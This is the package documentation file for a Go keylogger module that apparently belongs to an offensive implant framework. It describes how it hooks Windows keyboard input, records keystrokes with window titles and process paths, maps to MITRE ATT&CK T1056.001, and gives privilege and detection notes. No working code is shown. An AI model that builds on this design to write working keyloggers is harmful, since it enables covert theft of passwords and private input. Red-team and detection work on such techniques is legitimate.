//go:build windows

// Package keylog captures keystrokes via a low-level keyboard hook
// (`SetWindowsHookEx(WH_KEYBOARD_LL)`).
//
// `Start(ctx)` installs the hook and returns a channel of Event
// records. Each event includes the virtual-key code, translated
// character (or `[Enter]` / `[Backspace]` label), modifier flags,
// foreground-window title, and owning-process executable path. The
// message loop runs on a locked OS thread and tears down when the
// context is cancelled.
//
// # MITRE ATT&CK
//
//   - T1056.001 (Input Capture: Keylogging)
//
// # Detection level
//
// noisy
//
// `SetWindowsHookEx(WH_KEYBOARD_LL)` is one of the highest-fidelity
// behavioural signals EDR products track — almost no benign software
// installs a global low-level keyboard hook.
//
// # Required privileges
//
// unprivileged for hooking the implant's own interactive
// session — `WH_KEYBOARD_LL` is a global hook but its callbacks
// fire only for input destined for windows on the same window
// station as the hook installer. SYSTEM in session 0 installing
// the hook captures nothing from interactive users without
// first attaching the desktop via `process/session`. UIPI does
// NOT block the hook (low-level keyboard hooks are exempt).
//
// # Platform
//
// Windows-only (`//go:build windows`). The hook chain
// (`SetWindowsHookEx` / `CallNextHookEx` / `UnhookWindowsHookEx`)
// is a Windows construct with no POSIX analogue. macOS uses
// `CGEventTap`, Linux uses evdev / X11 — neither is wired up
// here.
//
// # Example
//
// See [ExampleStart] in keylog_example_test.go.
//
// # See also
//
//   - docs/techniques/collection/keylogging.md
package keylog
